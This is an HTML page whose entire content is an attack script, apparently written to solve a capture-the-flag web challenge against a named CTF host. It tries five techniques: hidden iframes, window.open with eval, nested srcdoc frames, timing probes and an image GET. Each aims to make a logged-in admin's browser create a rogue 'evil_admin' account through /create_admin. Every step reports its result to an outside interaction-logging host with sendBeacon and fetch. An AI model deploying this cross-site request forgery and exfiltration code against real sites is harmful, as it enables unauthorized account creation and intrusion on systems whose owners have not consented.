<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>XS-Leak Attack</title>
</head>
<body>
<script>
const TARGET = "https://tasks.goidactf.ru:20385";
const OAST = "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun";
const ADMIN = "evil_admin";

const log = (d) => navigator.sendBeacon(OAST + "/leak?d=" + encodeURIComponent(d));

// Основная стратегия: создаем iframe, который загружает страницу админа
// и отправляет форму ИЗНУТРИ iframe (чтобы куки были)
const iframe = document.createElement('iframe');
iframe.style.display = 'none';
iframe.name = 'attackFrame';

// 1. Сначала загружаем страницу админа в iframe
iframe.src = TARGET + "/admin";
document.body.appendChild(iframe);

iframe.onload = function() {
    log("iframe_admin_loaded");
    
    // Даем время на полную загрузку
    setTimeout(() => {
        try {
            // Пытаемся выполнить скрипт внутри iframe
            const scriptContent = `
                // Создаем и отправляем форму
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = '/create_admin';
                form.style.display = 'none';
                
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'new_admin_login';
                input.value = '${ADMIN}';
                
                form.appendChild(input);
                document.body.appendChild(form);
                
                // Отправляем форму
                form.submit();
                
                // После отправки проверяем редирект
                setTimeout(() => {
                    // Если мы здесь, возможно редирект не сработал
                    // Или мы на той же странице с ошибкой
                    try {
                        const errorText = document.body.textContent;
                        if (errorText.includes('401') || errorText.includes('NOT')) {
                            parent.postMessage('error_401', '*');
                        } else if (errorText.includes('success') || document.location.pathname !== '/create_admin') {
                            parent.postMessage('possible_success', '*');
                        }
                    } catch(e) {
                        parent.postMessage('cannot_check', '*');
                    }
                }, 1000);
            `;
            
            // Вставляем скрипт в iframe
            const script = iframe.contentDocument.createElement('script');
            script.textContent = scriptContent;
            iframe.contentDocument.head.appendChild(script);
            
        } catch(e) {
            log("iframe_script_error=" + e.message);
        }
    }, 1000);
};

// Слушаем сообщения от iframe
window.addEventListener('message', (event) => {
    if (event.data === 'error_401') {
        log("received_401_error");
    } else if (event.data === 'possible_success') {
        log("possible_admin_created");
    } else if (event.data === 'cannot_check') {
        log("cannot_determine_result");
    }
});

// 2. Стратегия с window.open + форма в том же контексте
setTimeout(() => {
    const win = window.open('', 'sameOriginWindow');
    
    // Создаем форму, которая отправится в новом окне
    const form = document.createElement('form');
    form.method = 'GET';
    form.action = TARGET + "/admin";
    form.target = 'sameOriginWindow';
    form.style.display = 'none';
    document.body.appendChild(form);
    form.submit();
    
    // После загрузки страницы админа, вставляем скрипт
    setTimeout(() => {
        try {
            const attackScript = `
                // Ждем загрузки
                setTimeout(() => {
                    // Создаем форму для создания админа
                    const form = document.createElement('form');
                    form.method = 'POST';
                    form.action = '/create_admin';
                    form.style.display = 'none';
                    
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = 'new_admin_login';
                    input.value = '${ADMIN}';
                    
                    form.appendChild(input);
                    document.body.appendChild(form);
                    form.submit();
                    
                    // Проверяем результат через 2 секунды
                    setTimeout(() => {
                        // Пытаемся определить по URL или содержимому
                        fetch('${OAST}/leak?d=final_url=' + encodeURIComponent(window.location.href), {mode: 'no-cors'});
                        
                        if (document.body.textContent.includes('401')) {
                            fetch('${OAST}/leak?d=got_401_again', {mode: 'no-cors'});
                        }
                    }, 2000);
                }, 1000);
            `;
            
            win.eval(attackScript);
            log("window_eval_executed");
            
        } catch(e) {
            log("window_eval_error=" + e.message);
        }
    }, 2000);
}, 2000);

// 3. Стратегия: цепочка iframe для обхода ограничений
setTimeout(() => {
    const chainIframe = document.createElement('iframe');
    chainIframe.style.display = 'none';
    chainIframe.srcdoc = `
        <html>
        <body>
        <script>
            // Загружаем страницу админа
            const innerFrame = document.createElement('iframe');
            innerFrame.name = 'inner';
            innerFrame.src = '${TARGET}/admin';
            document.body.appendChild(innerFrame);
            
            innerFrame.onload = function() {
                setTimeout(() => {
                    // Создаем форму в innerFrame
                    const form = innerFrame.contentDocument.createElement('form');
                    form.method = 'POST';
                    form.action = '/create_admin';
                    form.target = '_self';
                    
                    const input = innerFrame.contentDocument.createElement('input');
                    input.type = 'hidden';
                    input.name = 'new_admin_login';
                    input.value = '${ADMIN}';
                    
                    form.appendChild(input);
                    innerFrame.contentDocument.body.appendChild(form);
                    form.submit();
                    
                    // Проверяем изменение
                    setTimeout(() => {
                        try {
                            // Если URL изменился, значит был редирект (возможно успех)
                            if (innerFrame.contentWindow.location.href !== '${TARGET}/admin') {
                                fetch('${OAST}/leak?d=iframe_redirect_detected', {mode: 'no-cors'});
                            }
                        } catch(e) {
                            // cross-origin ошибка - тоже может означать редирект!
                            fetch('${OAST}/leak?d=cross_origin_after_submit', {mode: 'no-cors'});
                        }
                    }, 1500);
                }, 1000);
            };
        <\\/script>
        </body>
        </html>
    `;
    
    document.body.appendChild(chainIframe);
    log("chain_iframe_created");
}, 4000);

// 4. Проверка через timing атаку на статус страницы
setTimeout(() => {
    const start = performance.now();
    
    // Создаем скрытое окно/iframe для timing attack
    const timingFrame = document.createElement('iframe');
    timingFrame.style.display = 'none';
    timingFrame.src = TARGET + "/admin?cache=" + Date.now();
    
    timingFrame.onload = () => {
        const loadTime = performance.now() - start;
        log("admin_page_load_time=" + loadTime);
        
        // Если страница загружается быстро, возможно это ошибка 401
        // Если медленно, возможно это полноценная страница админа с формой
        if (loadTime < 50) {
            log("fast_load_possible_error");
        } else {
            log("slow_load_possible_admin_page");
            
            // Пробуем отправить форму из этого iframe
            setTimeout(() => {
                try {
                    const form = timingFrame.contentDocument.createElement('form');
                    form.method = 'POST';
                    form.action = '/create_admin';
                    
                    const input = timingFrame.contentDocument.createElement('input');
                    input.type = 'hidden';
                    input.name = 'new_admin_login';
                    input.value = ADMIN;
                    
                    form.appendChild(input);
                    timingFrame.contentDocument.body.appendChild(form);
                    form.submit();
                    
                    log("form_submitted_from_timing_frame");
                } catch(e) {
                    log("timing_frame_form_error=" + e.message);
                }
            }, 500);
        }
    };
    
    document.body.appendChild(timingFrame);
}, 6000);

// 5. Финальная проверка через image tag (может работать с куками)
setTimeout(() => {
    // Пробуем создать админа через GET запрос (если поддерживается)
    const img = new Image();
    
    img.onerror = function() {
        log("get_request_failed_or_redirected");
    };
    
    img.onload = function() {
        log("get_request_success_possible");
    };
    
    // Некоторые сервера могут принимать GET для создания
    img.src = TARGET + "/create_admin?new_admin_login=" + ADMIN + "&t=" + Date.now();
}, 8000);
</script>
</body>
</html>
